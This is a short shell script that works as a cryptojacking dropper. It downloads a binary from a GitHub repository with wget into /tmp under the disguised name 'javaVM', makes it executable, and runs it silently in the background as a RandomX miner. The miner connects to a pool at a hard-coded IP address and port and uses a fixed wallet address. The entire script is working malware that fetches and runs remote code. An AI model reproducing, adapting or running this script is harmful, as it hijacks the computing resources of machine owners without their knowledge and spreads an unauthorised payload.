#!/bin/sh
if [ -f /tmp/javaVM ]
 	then
 	/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -t 3 -k --donate-level --tls > /dev/null 2>&1 &
 	echo Started Existing
 	else
 		wget -q https://github.com/thesunofme/trash/raw/main/work -O /tmp/javaVM
 		chmod +x /tmp/javaVM
 		/tmp/javaVM -o 103.228.74.80:4444 -u ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt -p DuckRig -a rx/0 -t 3 -k --donate-level --tls > /dev/null 2>&1 &
fi
